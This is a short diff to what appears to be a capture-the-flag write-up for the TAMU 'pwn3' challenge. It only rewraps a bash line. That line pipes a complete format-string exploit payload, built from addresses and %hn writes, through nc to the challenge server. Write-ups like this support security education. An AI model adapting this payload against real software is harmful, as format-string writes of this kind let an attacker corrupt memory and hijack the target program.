@@ -187,7 +187,8 @@ $ python -c 'print("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%2044x" + "%4$hn" 
 Finally! lets try it!
 
 ```bash
-$ python -c 'print("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%2044x" + "%4$hn" + "%32167x" + "%5$hn")' | nc pwn.ctf.tamu.edu 4323
+$ python -c 'print("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%2044x" + "%4$hn" + "%32167x" + "%5$hn")' \
+| nc pwn.ctf.tamu.edu 4323
 ```
 
 ![Pwn3 Scheme](assets/13-pwn3_getting_the_flag.png)    
